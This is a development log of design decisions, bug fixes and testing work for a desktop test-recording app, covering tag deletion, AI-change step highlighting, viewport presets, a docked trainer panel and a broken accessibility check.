**`bg-panel` for raised cards — and why the obvious measurement of it is wrong.** Rendered against a white page, `bg-panel` measures *identical* to the window background (ΔE=0), which reads as "this token does nothing". It is not an artifact of the token: `--color-surface-panel` is `--bg-secondary-40` and `--color-window-bg` is `--bg-40`, and the SDK defines `--bg-secondary` and `--bg` to the same value in both themes — so a panel is literally the window's own background token applied a second time. That only produces a visible surface because the WebView has **no opaque background of its own** and both layers composite onto the native macOS window material. Measured over a representative material the card reads at ΔE 8.7 (light) and 13.9 (dark) against the app background. Worth knowing: if this app ever sets an opaque window background, every `bg-panel` surface silently flattens.

**Two sites did not take the general mapping.**
- The floating "Apply to all steps" chip in `visual-view` was `bg-token-surface-raised/90`, over an arbitrary user screenshot. It became `bg-popover` rather than a 90%-opacity `bg-panel` — the SDK's own note on `--color-surface-popover-hover` says elevated chips need solid fills "because translucent fills would let content show through".
- The screenshot's hairline used `ring-token-border`. There is no themed `--color-border-*`, so `ring-border-separator` would not generate either — `ring-*` resolves from the `--color-*` theme namespace, and the border roles live in `:root` instead. It uses `ring-[var(--color-border-separator)]`, which the SDK's VAR-SAFETY comment explicitly sanctions: semantic role tokens are real `:root` declarations and are safe to read through raw `var()`.

**`script-view.tsx` was left alone.** Its `text-[var(--color-token-primary)]` syntax-highlighting classes match the same `-token-` grep but are a different thing entirely — arbitrary-value utilities over `--color-token-*`, which the SDK really does define (light and dark). They emit CSS and work.

**Verifying both themes needs `.dark` on the root, not on a container.** A subtree `.dark` does not work with this design system: custom properties are substituted where they are *declared*, so `--color-window-bg: var(--bg-40)` resolves against `:root`'s seeds and inherits down as an already-computed value; overriding `--bg` further down cannot retroact. A first attempt at side-by-side light/dark panes silently produced two identical light renders. Each theme has to be rendered in its own pass.

**Coverage:** none added. The defect is a property of the emitted stylesheet, which no unit test in either project observes; the guard that would actually work is a source-level `check:*` that validates every `bg-*`/`border-*` class in `renderer/` against the `--background-color-*` / `--border-color-*` names declared in the SDK's `components.tailwind.css`. A prototype of that check agrees exactly with the build output — it flags the two remaining dead classes (`bg-muted` in `settings-view.tsx`, `bg-fill-secondary` in `library-sidebar.tsx`) and nothing else — but it was left out of this change as out of scope. `bg-separator` is NOT dead despite emitting no bare rule: it is only ever used under a named-group variant, so it compiles to `.group-hover\/gap\:bg-separator`.

### 2026-08-06 — Deleting a tag, from the Batch view's tag cluster

**Goal:** Tags could be created and edited (sidebar → Edit Tags…) but never
removed from the library. A typo or an abandoned grouping stayed in the chip row
forever, and clearing it meant opening every test that carried it — which is
also how you'd never be sure you got them all.

**What was done:** The Batch view's chip row moved to `renderer/main/tag-cluster.tsx`
as a bordered cluster, each real tag carrying an X behind a confirmation that
states how many tests use it and names them. New `tests:deleteTag` handler over
a new `testStore.removeTag`.

**Key decisions:**

1. **Delete lives with the tag vocabulary, create lives with the test.** Creating
   stayed in the sidebar dialog — that's where you know which test you're
   labelling. Deleting is library-wide, and the cluster is the only place the
   whole vocabulary is visible at once *with counts*, which is what makes the
   scope of the act legible.

2. **The count is the point of the confirmation, not politeness.** A tag is the
   batch's grouping key: deleting one silently re-scopes what "run smoke" means.
   And unlike editing one test's tags, it can't be undone by re-typing — the tag
   is gone from N tests and nothing remembers which. So the dialog leads with the
   count and lists the affected test names (capped at 8, then "+N more").

3. **One backend call, not a renderer loop over `tests:setTags`.** A loop
   rewrites `tests.json` once per test and can strand the tag on half the library
   if a call fails partway. `removeTag` does one `writeAll`.

4. **Hidden tests are included, and that's why the toast doesn't echo the
   preview.** `testStore.list()` filters hidden tests out, so a tag left on one is
   invisible right up until the test is unhidden — at which point a deleted tag
   reappears. `removeTag` therefore reads through `readAll()`. The renderer can't
   see those tests, so its dialog count is a lower bound; the toast reports the
   backend's real number instead of repeating what it guessed.

5. **Matching is case-insensitive**, because `tagCounts` groups `smoke` and
   `Smoke` into one chip. Deleting that chip case-sensitively would leave the
   other spelling behind and the chip would return with a count of 1.

6. **The X is a sibling button, not nested in the filter button.** A `<button>`
   inside a `<button>` is invalid markup that swallows the inner click, so the
   chip is a `<span>` holding both. The X is also the `AlertDialog`'s own trigger,
   which means no open-state to keep in sync and focus returns to the chip on
   cancel.

7. **Visible at rest, not revealed on hover.** A hover-only X on a pill this
   small is undiscoverable, and it's the entire affordance. It stays muted next
   to the count; the red wash on its own hover is what carries "destructive".

**Incidental finding:** the `border-token-border` / `bg-token-surface-raised` /
`bg-token-hover` class names used throughout `renderer/` are **not** utilities the
design system defines — they generate no CSS and have been silently doing nothing.
Verified against the built stylesheet. The real names are `border-secondary`,
`bg-well`/`bg-panel`, `bg-list-hover`, etc. `tag-cluster.tsx` uses the real ones;
the rest of the renderer was left alone as out of scope.

**Verification:** `handlers.test.ts` gained 5 tests for `tests:deleteTag`
(case-insensitive removal, hidden tests, canonicalization, hostile input, unused
tag) and `tag-cluster.test.tsx` 12 for the UI. Both suites were confirmed to fail
against reverted behaviour: injecting an X that deletes without confirming, an X
on "All", a case-sensitive count, and a toast echoing the preview each broke the
test that guards it. Rendered against the real built stylesheet in light and dark
to confirm the cluster and the X's states read correctly.

### 2026-08-06 — Showing which steps an AI change added

**Symptom:** applying an AI-debug fix rewrote the spec, and the Steps tab quietly re-rendered a different list. Right steps, right order, no error — and nothing at all saying what had changed. The apply usually happens from the AI panel while the user is looking at the Run tab, so by the time they reach Steps the change is already history. Inserting an AI-generated flow in the trainer had the same shape: the list just got longer, often past the scroll.

**Why the diff has to be content-based.** `tests:updateScript` re-parses the whole spec, and `spec-parser.ts`'s `makeStep` calls `randomUUID()` for **every** step on **every** parse. After an apply that changed one line, all N ids differ — so a diff by id marks the entire list as new, which is exactly as uninformative as marking none of it. The only thing that survives an apply is what a step *says*, so `renderer/lib/diff-steps.ts` compares an explicit signature of the user-visible fields. The alternative — making the parser preserve ids — was rejected: it would put the burden of a display concern on the security-sensitive parse path, and id stability across a re-parse is a much stronger claim than this feature needs.

**The signature is a field list, not "the step minus id and timestamp".** Both directions have a failure mode; they are not symmetric. Enumerating means a field added to `Step` later is invisible to the diff — a *missed* highlight, which degrades to today's behaviour. Stripping means every future field is automatically significant, so one backend field that happens to be recomputed on parse would light up every row, permanently, with no obvious cause. A quiet under-report beats a loud wrong one.

**Moves are cancelled against removals, one for one.** The bare LCS reports a reordered step as a removal plus an addition, so dragging a row would have claimed the AI added it. Each addition cancels against at most one identical removal — a `Set.has` would have swallowed a genuinely new duplicate whose twin happened to move in the same pass.

**A substitution glows its replacement.** The most common AI fix is a swapped selector, and the resulting step is one the user has not seen. Counting it as "the same step, edited" would hide precisely the row they need to look at.

**Deletions are unstyled, deliberately.** There is no row left to decorate, and decorating the neighbours would point at the wrong step. The step count on the tab is what carries removals — for additions, deletions and substitutions alike.

**Inset outline, not border, and only `outline-color` animates.** Both were bugs before they were decisions. A real border participates in layout, so rows jump by 2px when the highlight clears, and it collides with the drag-over `border-t-2` on the same element at equal specificity — decided by stylesheet order rather than intent. And an earlier version pulsed a `box-shadow` glow, which silently erased the selection and run-status highlights: those are `ring-*` box-shadows, and an animation owns the whole property. Animating something nothing else uses is what lets a step be new **and** failing at once — the single most interesting row on the screen, where neither highlight may hide the other.

**Not on a timer.** The obvious design is to fade the highlight after a few seconds. That fails the actual usage: the apply happens on a different tab, so the timer would expire before the user ever looked. It clears when the claim stops being true instead — the next apply, a hand edit of the steps, a new recording session.

**Generated steps get their own insert path.** `insertStep` *clears* the highlight, because a hand edit retires it; routing AI-generated steps through it would leave them unmarked however good the diff is. `insertGeneratedSteps` sends them sequentially (each insert lands at the session cursor and advances it) and then re-reads `getSteps()` rather than waiting on the `recorder:steps` push — invoke replies and pushes are different channels with no ordering guarantee, and a diff run a beat early marks only the first inserted step. It diffs what actually landed, since backend normalization can reject a step the model produced.

**Found while wiring it:** the Steps tab trigger is gated on the list being non-empty, and `TabsRoot` was uncontrolled. An apply that deleted every step removed the trigger while its content stayed selected, leaving an empty pane with nothing active in the tab bar. The tabs are now controlled with a fallback to Script.

Guarded by `renderer/lib/diff-steps.test.ts`, the new blocks in `step-row.test.tsx` / `test-detail-view.test.tsx` / `recorder-store.test.tsx` / `recording-view.test.tsx` / `ai-debug-icons.test.tsx`, and `check:step-glow` — which pins the stylesheet, the outline-not-border and outline-color-only choices, and the insert-path wiring, none of which jsdom can observe.

### 2026-08-06 — Window size preset in the New Recording dialog

**Symptom:** the New Recording dialog asked for a URL, a test name and a run speed, and gave no way to say how big the browser window should be. Every manual recording was made in one fixed 1200×820 window, so a mobile or tablet flow could not be recorded at all.

**The decision that mattered — the preset sizes the window AND the test.** Sizing only the trainer window would have been the smaller change and the wrong one: the recorded steps carry no size, so the generated spec runs at Playwright's own default (1280×720). A flow recorded against a 390-wide mobile layout would then replay against the desktop layout — different DOM, different locators, and a failure that points at the locators rather than at the size. So a chosen preset is also recorded as the session's **first `viewport` step**, before the `goto`. Before, not after: `setViewportSize` after `page.goto` means the first paint, and anything the site decides from it, happens at the wrong size. This also matches what the LLM prompts have required of generated specs since 2026-08-03 — viewport first, exact dimensions — so recorded and generated tests now describe their size the same way.

**`useContentSize: true`, not a plain width/height.** With a preset the numbers are the PAGE size, because that is what the recorded viewport step replays at; sizing the native frame instead would leave the page short by the title bar's height and the window would disagree with the step the same call just recorded. Verified `useContentSize` is actually implemented in this SDK (it reaches the native `window.create` call) rather than assumed from Electron. The OS still clamps a window bigger than the display — a 1440×900 preset on a 1440×900 screen records at a slightly smaller page — so the size is logged at session start, and the recorded step, not the window, is authoritative.

**Re-opening a test takes its size from the test, not the dialog** (`recordedViewport(steps)`, first viewport step — a later one is a mid-test resize, not the size the run starts at). Otherwise "Edit in Trainer" on a mobile test would drop it into a desktop-width window and capture new steps against a layout that test never runs at. No second viewport step is added on that path.

**Persisted as `{width,height} | null`, not a preset id.** The picker list then lives in exactly one place — `renderer/lib/viewport-presets.ts`, now shared with the Generate-from-prompt dialog, which had its own copy of the same five sizes — and the backend validates two numbers instead of an id vocabulary it would have to keep in sync. A stored size matching no preset (hand-edited file, or a preset dropped in a later version) falls back to "Default" so the trigger is never blank. `null` is a real choice, so the settings merge applies the update whenever the key is PRESENT; a truthiness test would have made returning to the default size impossible.

**Normalized, not cast.** The numbers arrive over IPC and end up in a native window call and interpolated into generated source, so `normalizeViewport` rebuilds them: non-numeric, non-finite, non-positive and half-specified sizes are `null`, and the rest are rounded and clamped. A half-specified size is rejected rather than completed from the other axis — guessing would silently record a size the user never chose. `script-generator`'s `num()` remains the second guard, per the capture-boundary rule.

**Interaction with the docked trainer panel (found on merge, not by a test).** The panel landed on `main` while this was in review, and the two features cancel each other out: `computeDock` is deliberately total-preserving — it splits the training browser's footprint rather than growing it, "because the user picked how much screen the training browser takes and docking a panel is not a licence to take more." That premise holds for a width the user dragged and fails for a width the test replays at. Docking a 360pt panel against a 390-wide mobile recording left the page rendering at 600 (the browser floor) while the recorded `viewport` step still said 390 — silent, and exactly the divergence the preset exists to prevent. `computeDock` gained a `preserveBrowserWidth` option: the browser keeps its width, the pair's total grows instead, and when that no longer fits the display it returns `null` so the panel opens **undocked** — an outcome the caller already handled — rather than quietly resizing what it was told not to. The `BROWSER_MIN_WIDTH` floor is deliberately not applied in that mode: it exists to stop docking from *accidentally* forcing a mobile layout, not to forbid one the user explicitly chose. Two consequences that would each have been a separate silent bug: `undock` must not hand back width it never took (it would push the browser *past* its preset), and the `viewportNarrowed` warning must not fire when nothing narrowed.

**Interaction with the insert cursor (same merge, second collision).** `initialCursor` landed on `main` to put a continuing session's cursor "just past the goto", implemented as `min(1, stepCount)` — correct while the navigation was always index 0. A test recorded at a preset opens with a `viewport` step, so its goto is at 1, and a cursor of 1 would drop every newly captured step BETWEEN the viewport and the goto: recorded before the page had been navigated to at all. `initialCursor` now takes the STEPS and finds the navigation (`findIndex(type === "goto")`) rather than assuming its index — same contract, stated as the rule instead of the layout that happened to satisfy it. Its existing cases were kept, translated to step lists.

**Coverage:** `main/recorder/window-size.test.ts` (the pure rules, plus source-level pins on the service wiring — viewport-before-goto, `useContentSize`, editing-takes-its-own-size — since `start()` creates a real BrowserWindow and can't be invoked in a test) and `renderer/main/new-recording-dialog.test.tsx` (the preset reaches `start` as the 4th argument, and "Default" passes `null` rather than a fabricated 1280×800). Both verified to fail when the viewport argument is dropped from the dialog's `start` call. The SDK's `Select` is native-menu-backed so the picker can't be driven in jsdom; the persisted setting is what puts a preset in play, which is also the path a returning user takes.
### 2026-08-06 — Trainer waits for its step list, and opens the cursor after the navigation

Three defects around opening a trainer session, found together.

- **A window that opened mid-session never got the steps.** `recorder:steps` is a PUSH whose first fire happens inside `recorder:start`, before the training browser has even loaded. The docked trainer panel is created later (once the page is ready), so it missed that broadcast entirely and showed an EMPTY step list for a test with a dozen steps — until the user happened to mutate something, at which point they all appeared. Fixed by adding `recorder:getSteps` and having the store ASK on mount as well as listen. A push is not a substitute for being able to ask; any future window inherits the fix.
- **Controls were live before the steps were.** `controlsDisabled` gated only on `pageReady`, which is about the BROWSER, not about this window's data. Every trainer control acts relative to the step list — the insert cursor decides where the next captured step lands — so acting before it arrives inserts at the wrong position or does nothing, both silently. Now gated on a `stepsLoaded` flag as well, in both trainers. The status badge reads "Loading steps…" rather than leaving a "Recording" badge above a row of dead controls, which reads as a broken trainer.
- **The insert cursor started at the END of the test.** Opening a session executes exactly one thing — the initial navigation; no recorded step is replayed (that auto-replay was removed earlier for flying through the whole test). So the session's position is "just past the goto", but the cursor defaulted to `existingSteps.length`. Recording three clicks at the start of a checkout flow appended them after the final assertion: nothing errors, every step is present, and the order is wrong until the test runs. `initialCursor(editing, steps)` now returns the position just past the navigation when continuing an existing test. A NEW recording still passes an empty list and its `goto` advances the cursor through the normal insert path, so both cases converge on one rule rather than two. *(Amended when the window-size preset merged in: it takes the STEPS and finds the goto with `findIndex` rather than assuming index 0, because a test recorded at a preset opens with a `viewport` step ahead of the navigation — see that entry.)*

- **Confirmed NOT broken:** nothing auto-runs a recorded step on open. `replayStep` / `replayFromStart` / `replayAll` / `replayFromCurrent` are reachable only from an explicit user action; the initial navigation is the only thing executed.
- **Files:** `main/recorder/types.ts` (`initialCursor`) + `initial-cursor.test.ts`, `main/services/recorder-service.ts`, `main/handlers/index.ts`, `renderer/lib/api.ts`, `renderer/main/recorder-store.tsx`, both trainer views + all three test suites.
- **Verified:** `lint`, `type-check`, `test:all` (825 tests) and `build` green. Mutation-tested per CLAUDE.md: restoring the end-of-list cursor fails 1 test, dropping the `stepsLoaded` gate fails 1 test in each trainer, and removing the catch-up fetch fails 2 store tests.

### 2026-08-06 — Replay is a return arrow, not a play triangle

- **Symptom:** in the docked trainer panel, "Replay from the current step" and the pause/resume control sat side by side as two identical ▶ triangles.
- **Why it hid:** the neighbour is a TOGGLE. While recording it draws a pause bar, so the pair looks fine; the collision only appears once the user pauses and the button becomes a play triangle. Both controls render correctly and both have correct accessible names, so nothing in the DOM is wrong — the two are simply indistinguishable to look at, while doing very different things (replay the recorded steps vs. carry on recording). The panel's tool row is icon-only at ~360px, so the glyph is the entire signal and the label is a tooltip you get after hovering.
- **Fix:** `RotateCcw` (a return/repeat arrow) for replay, in **both** trainers. The main window keeps a text label so it never had the collision, but the same action must not wear a different glyph in the two windows — and if that row ever tightens to icon-only, the bug would arrive silently.
- **Testing:** icons are asserted by GLYPH, not by label. Every lucide icon ships a `lucide-<kebab-name>` class, which is the only thing in the DOM naming the shape the user sees; accessible names are useless here precisely because the bug is two differently-labelled controls drawing the same picture. `glyphOf()` reads that class in both suites. Beyond pinning the specific pair, `trainer-panel-view.test.tsx` asserts the whole tool row has no duplicate glyphs, so a future tool reusing one fails without anyone remembering this entry.
- **Files:** `renderer/trainer/trainer-panel-view.tsx`, `renderer/main/recording-view.tsx`, + both test suites (6 new tests).
- **Verified:** `lint`, `type-check`, `test:all` (809 tests) and `build` green; reverting the icon turns 3 panel tests and 2 main-window tests red.

### 2026-08-06 — "Check accessibility" never reported anything: a closure that didn't survive the page boundary

**The symptom:** the per-test toggle and the global default both worked, runs
took visibly longer with it on, and no result ever appeared anywhere — no
badges in the replay, no accessibility line in Stats. The run log carried
`[glaze-a11y] check failed: ReferenceError: MAX_VIOLATIONS is not defined`,
43 times across the retained logs.

**The cause:** `runAxe` in `capture-fixture-source.ts` closed over the fixture's
own `MAX_VIOLATIONS` / `MAX_NODES` from inside a `page.evaluate` callback.
`page.evaluate` serializes its callback to source and re-evaluates it **in the
page**, which keeps no scope from the fixture module — so the compaction step
threw. The caps are now passed as an argument instead.

**Why it stayed invisible for so long, which is the part worth remembering:**
every safety property of this feature worked exactly as designed and each one
removed a signal. The throw happened *after* `axe.run` resolved, so the run paid
the full cost and looked busy. `runAxe` never throws by design — accessibility is
reporting, not a gate — so it returned `null`. `null` is also the legitimate
"axe was never injected" answer, so nothing downstream could tell the two apart:
the manifest got no `a11y` entry, `enrichWithA11y` had nothing to enrich, the
replay had no payload to badge, and `capture-overhead.ts` counts a run as an
accessibility run only when `a11yChecks > 0` — which was always 0 — so Stats
stayed silent too. A feature can be fully built, fully tested, and still report
nothing, if the one unguarded step is the one that crosses into the browser.

**Why the suite missed it:** `check:visual-pipeline` seeds manifest entries
directly and drives the diff/baseline logic without a browser — which is what
makes it fast and is still right. Nothing evaluated the fixture's axe callback
the way Playwright does. `capture-fixture-a11y.dom.test.ts` now extracts `runAxe`
from the shipped string and runs it against a fake `page` whose `evaluate`
**deliberately re-evaluates the callback from its source**, reproducing the scope
loss. Writing that fake the obvious way — calling the callback directly — passes
against the bug, so the isolation is the test.

**Rule this generalizes to:** a `page.evaluate` / `addInitScript` callback is a
boundary as real as the capture boundary in `CLAUDE.md`. Nothing from the
enclosing module reaches the other side; pass it as an argument, and test it by
evaluating what ships.

**Then the reason it took months to notice, fixed as its own problem.** The bug
was cheap; being unable to see it was not. Between the toggle (on the test) and
the results (in the Visual view) there was nothing at all, so three different
situations produced one identical observation: nothing.

- **`describeA11yOutcome`** (`a11y-diff.ts`, pure) writes one line into the run's
  own Output panel, next to the existing "Capturing screenshots" / "Recording
  console and network" notices — plus a matching "Checking accessibility for
  this run" before it, since a check that only announces itself by making the
  run slower announces nothing. The line states the number of **completed**
  checks separately from what was found, and **zero completed checks is reported
  as a fault**, never as "no issues found". That distinction is the whole point:
  it is the sentence that would have surfaced this bug on day one, and the test
  that pins it is the first one in its block.
- **The Visual run list** now marks runs with unaccepted violations. The count
  (`a11yNewSteps`) had been computed, stored and shipped to the renderer since
  the feature landed, and read by nothing — so a run that was visually identical
  but newly inaccessible was indistinguishable from a clean one without opening
  it. Its own `Accessibility` icon rather than the existing `Eye`: "something
  changed visually" and "something is inaccessible" send you to different places.

**The general lesson, worth more than the fix:** a result that is only visible
somewhere the user has no reason to look is not a result. Both halves of this —
the swallowed error and the invisible output — were failures of the same kind,
and the working feature is the one that says what it did where the user already
is.

**Finally, the results themselves moved to the test.** A summary line says what
happened; it does not say *what is wrong with the page*. Reading that still meant
leaving the test, opening the Visual view, finding the right run and scrubbing to
the right step — four navigations away from the toggle that asked for the check.
So there is now an **"Accessibility" tab** on the test detail view
(`a11y-panel.tsx`), placed after Heals.

- **It describes the most recent run that CHECKED, not the most recent run**
  (`latestA11yRun`). A later run with the toggle off must not blank the panel:
  an empty result reads as "the issues were fixed", which is the most damaging
  thing this feature could say incorrectly.
- **That selector keys on `a11yMs`, not just `a11yChecks`,** so a run where axe
  executed but every check failed still counts as "checked" — otherwise a broken
  check would render the same empty state as a test nobody enabled it for. Same
  rule as the summary line, one layer up.
- **`a11y:resetBaseline` finally has a UI.** It had a handler and an API method
  and no caller anywhere: accepting was one click and un-accepting was
  impossible. "Reset accepted" is always offered, not just when something is
  flagged — the moment you need it is right after an over-eager "Accept all",
  when nothing is flagged any more.
- **The violation rendering was extracted** (`a11y-violations.tsx`) rather than
  copied. The impact colours ARE the triage and the new-vs-accepted split is the
  verdict; two hand-written copies would drift into disagreeing about which
  issues matter, and the drift would be invisible because both would look fine.
- Imported tests don't get the tab, matching Variables and Heals: the check runs
  from the capture fixture, which an imported spec never loads, so the tab could
  only ever be empty.

### 2026-08-06 — Sticky trainer panel docked to the training browser (mabl Trainer)

- **Goal:** Remove the window ping-pong that dominates training. The browser is its own window; every control lived in the main app window, so recording one assertion was click-in-page → find app window → click Assert → find browser → click element. mabl solves this by docking its Trainer to the right edge of the app under test.
- **Research (mabl):** their annotated Trainer UI has a narrow column — journey details, step list with hover-delete, an icon tool row (assert / find element / wait / variable / replay), Save, Cancel — plus an explicit **undock** control. Their newer builds describe the trainer as "a separate window that can be resized and moved independently … preventing the trainer from blocking the browser", i.e. they retreated from a hard dock. A public experience report records the two bugs they shipped, and both became design constraints here: **resizing the browser while training could hang the product in an endless loop**, and **the trainer could not be moved to another screen**.
- **Scope (confirmed with the user):** essentials only in the panel; **both trainers live** (the main window's `RecordingView` is untouched); docking **shrinks the browser** rather than overlaying it; follow move + resize with undock/re-dock. Out of scope: persisting dock side/width/undocked position, and cross-display / full-screen *support* — those got defined degraded behaviour instead (auto-undock + a push the renderer toasts), because undefined behaviour is what mabl shipped.
- **Key decisions:**
  - **Two geometry operations, not one.** `computeDock` runs once and splits the browser's footprint; `computePanelFollow` runs on every event and never touches the browser. A single function was written first and an idempotence test caught it: feeding an already-docked browser back in re-splits it, so every drag walked the browser up to 240px narrower until it hit its floor, and it also silently undid the user's own resizes. The two are now separate by contract, and `panel-dock.ts` says why at the top.
  - **Shrink, don't overlay.** A panel covering the right edge of the page hides exactly the content you need to click. Cost: the training viewport narrows mid-session, so a responsive site can re-lay-out. Made visible rather than silent via a one-per-session `trainerPanel:viewportNarrowed` push, and dock/undock only ever changes width, never height.
  - **Flip sides before giving up.** Dragging the browser against the right edge of a monitor is ordinary; `computePanelFollow` tries the other side before returning `null`. Clamping was rejected — it puts the panel on top of the page under test, which is the one thing the feature exists to prevent.
  - **Three defences against the reentrancy loop**, not one: `applyBounds` is the sole bounds writer and raises an `applying` flag; `isDuplicateApply` rejects an event carrying a rectangle we just wrote (the flag alone loses to an event delivered a tick late — it would work on a fast machine and loop on a slow one); and the follower subscribes to the BROWSER only, never the panel. Pinned by `check:trainer-panel`, because the failure is silent and a unit test cannot catch a wedged event loop.
  - **One fan-out, inside `sendToMain`.** ~50 call sites push backend→renderer through that single function, so the panel is registered there rather than at any call site. A panel receiving *most* channels would leave two trainers disagreeing about the step list — which presents as a step-ordering bug in the recorder, not as a missing subscription.
  - **Two live trainers turned out to be mostly safe already.** `refiningStepId` and the dialog flags are per-window React state in the store, so a Refine started in one window cannot open a dialog in the other. The one genuine conflict was `recorder:contextAction` (right-click in the browser), which is broadcast: both windows would open a prefilled Add-step dialog. Fixed with an addressed `target` field rather than a point-to-point send, so the single broadcast path survives; the panel wins when open, since it is the trainer adjacent to the browser.
  - **Dock state is backend-owned.** The panel's ⤢ button moves only when a push says the windows moved. An optimistic flip is right most of the time and wrong exactly when it matters — a refused dock leaves the label inverted and the control then looks dead, because pressing it asks for the state it is already in.
  - **Opt-in** (`trainerPanelEnabled`, default false). The feature moves and resizes the user's real windows.
  - **`RecorderProvider` no longer calls router hooks.** It hard-depended on `useNavigate`/`useQueryClient` for one thing — navigating to the finished test — which would throw outright in a router-less panel window. That behaviour moved to an injected `onFinished`, supplied by `RootView`.
- **Rejected:** an in-page overlay injected into the training browser (the capture boundary is a security boundary — the page could read, style or spoof the controls); a `BrowserView`-style child view composited into the browser window (no such API in this SDK, verified against the SDK reference, so it has to be a real second window).
- **Files:** `main/services/panel-dock.ts` + `panel-dock.test.ts`, `main/windows/trainer-panel-window.ts`, `main/services/app-window.ts` (aux fan-out), `main/services/recorder-service.ts` (open/close + `ctxAction` target), `main/handlers/index.ts`, `main/recorder/types.ts` + `renderer/lib/recorder-types.ts` (`trainerPanelEnabled`, `ContextAction.target`), `renderer/trainer/*` + `trainer-window.html`, `renderer/main/recorder-store.tsx` (`onFinished`), `renderer/main/root-view.tsx`, `renderer/main/step-row.tsx` (`CursorGap` moved here — both step lists need it), `renderer/main/recording-view.tsx` (ignores panel-addressed actions), `renderer/settings/settings-view.tsx`, `main/services/__tests__/trainer-panel.check.ts`.
- **Verification:** `lint`, `type-check`, `test:all` (45 files / 803 tests, 27 new + `check:trainer-panel`'s 27 assertions) and `build` all green. Per CLAUDE.md, each new guard was mutation-tested: removing the side-flip fails 2 tests, a 1px gap between the windows fails 14, dropping the `target` check fails the address test, an optimistic dock flip fails the dock-state test, and a `setBounds` outside `applyBounds` fails the source check. **Not yet live-verified** — every behaviour here is native window geometry, which a terminal cannot observe; see the follow-ups below.
- **Follow-ups for the first run in the Glaze app:** the panel logs `trainer-panel: First follow event of this session` once per event type, which answers the one thing the SDK docs do not — whether `move`/`resize` stream during a drag (panel glides) or only `moved`/`resized` fire at the end (panel snaps). Both are handled; only the feel differs. Also unverified: whether `parent`-style native child-window behaviour would make the follower redundant (the follower deliberately does not depend on it), and whether resizing the training window mid-session perturbs the injected capture script.

### 2026-08-04 — A real test runner, and the first component/DOM tests

**Goal:** "Are there unit tests for all app surfaces?" — no: 18 standalone assertion scripts covering pure logic, and zero coverage of 27 React components (~11k lines), the IPC layer, the injected capture script, or the replayer. This is the plan to close that, and its first three layers. (Commits `14b8b50`, `9b199d3`, `a6951f8`, `8905078`.)

**The approach, in layers:** (0) adopt Vitest with node + jsdom projects; (1) leave the 15 `check:*` scripts working rather than a big-bang migration — they catch real bugs today; (2) fill backend gaps riskiest-first; (3) component tests; (4) one command (`test:all`) so the two systems can't drift.

**What landed:** the runner and its `@glaze/core` resolution (see Conventions), 22 DOM tests executing the injected replayer for real, 12 Batch view component tests, and a 57-case `describeStep` parity test.

**Two findings, both from tests written this session:**
- The **replayer ↔ Auto-Heal coupling**: `recorder-service` decides whether to run Auto-Heal by matching the replayer's ERROR TEXT (`isLocatorFailure`). Reword the message and Auto-Heal silently stops firing — no error, nothing fails. Now pinned in both directions; verified by rewording, which fails exactly that test.
- **A real drift**, found on the parity test's first run: a keyboard press with no locator read `page.keyboard.press(...)` in run logs but `keyboard.press(...)` in the trainer. The renderer was dropping the prefix. Fixed.

**Deliberately NOT done, and why:** the `check:*` scripts were not migrated. They work, they're regression-tested, and rewriting 15 of them buys tooling consistency at the cost of temporarily losing coverage that has repeatedly caught real bugs. Better done incrementally.

**Then the IPC layer (`19b203c`):** the backend stub gained a **recording `ipcMain`** — `registerHandlers()` is a block of `ipcMain.handle()` calls with no other way in — so tests invoke handlers exactly as the renderer does, against the REAL services writing to a temp userData dir. 20 tests covering the trust boundary: tag normalization under hostile input, browser validation (and that nothing was stored on rejection), `batch:run` selection validation, webhook scheme rejection, that a saved webhook URL never crosses back over IPC, and settings merge semantics (a partial update must preserve unrelated keys — every feature writes settings independently, so a merge bug would silently drop preferences). The stub's `safeStorage` now defaults to unavailable and must be opted into, so a test not thinking about secrets can't wander into a persistence path.

**Volume pass (`dd0c322`, `71bb106`):** +82 tests — `visual-diff`, LLM response parsing, line-diff, the LLM error formatter, the Auto-Heal probe, and component tests for Stats and the Cookies panel. **The Auto-Heal probe tests found three real bugs**, all of which made the engine propose the WRONG element — which matters because `tryHeal` auto-applies the top candidate when the re-run succeeds, and clicking the wrong button usually does succeed, so the step gets marked passed: (1) `collectElements` de-duplicated by `tagName|id|className`, so any two plain `<button>`s with no id/class collapsed to one key and every element after the first was silently dropped (the dedup was also unnecessary — a comma-separated selector list already returns a unique set); (2) the cross-kind similarity check was one-directional, so the commonest heal of all (renamed testid, unchanged label: orig `submit-button` vs candidate text `Submit`) scored the correct element at zero; (3) `cand.role === orig.role && cand.name === orig.name` is trivially TRUE when both are absent — always, for testid locators — so every same-kind candidate scored 0.8 and drowned out real text matches at 0.4. Each fix independently verified by reverting it.

**Testing gotcha worth keeping:** a view's table renders BEFORE its query resolves, so `findByRole("table")` returns an empty body and reads as "no runs". Helpers must wait for ROWS, not for the table — otherwise the test passes while proving nothing.

**Volume pass continued (`2216a5f`, `06e96c1`, `1879c4e`, `e30673f`):** +78 more tests — `import-service` (driven against real temp dirs, since the logic IS filesystem behavior), the tags dialog, `StepRow`, `TestDetailView`'s run controls, `llm-service`, and the step editor. **273 Vitest tests + 15 checks.**

**`llm-service` testing found another real bug:** `hasKey()` only checks the key FILE exists while `getKey()` decrypts and returns null on failure, so they disagree whenever the file is present but undecryptable (corrupted, or `safeStorage` unavailable after a keychain/machine change). `fetchModels` returned `[]` there without throwing, so `status()` reported `reachable: true` with zero models and NO error — a green "connected" dot for a provider that cannot authenticate, then every chat failing. It now throws the same actionable message the no-key path uses.

**Bugs found by this testing effort so far: seven** — three in the Auto-Heal probe, the `describeStep` backend↔renderer drift, the visual-timeline misattribution, the batch run-order slip, and this one. **Every one was a silent failure; none threw.** That is the argument for the whole exercise.

**Testing conventions worth keeping:** (1) after adding a test that should catch a bug, REVERT the fix and confirm that exact test fails — done for every fix above; (2) never guard an assertion with `if (thing)`, which passes vacuously the day `thing` stops rendering; (3) a component's table renders before its query resolves, so wait for ROWS not for the table; (4) jsdom lacks layout, `IntersectionObserver` and `ResizeObserver` — the shared setup stubs them, and a missing one surfaces as a bare ReferenceError from inside the SDK bundle that reads like a component bug.

**Trainer covered (`d110d91`):** 12 tests for `RecordingView`, the largest component and the app's core feature. **285 Vitest tests + 15 checks; `npm run test:all` runs both.**

**More jsdom/Radix gotchas learned there:** the SDK's auto-scrolling ScrollArea calls `Element.scrollTo`, which jsdom lacks (now stubbed in the shared setup); and **Radix `TabsTrigger` activates on pointer-down/focus, not a bare `click`** — `fireEvent.click` leaves the tab unchanged, so assertions silently run against the PREVIOUS tab's content. `recording-view.test.tsx` has a `selectTab` helper for this.

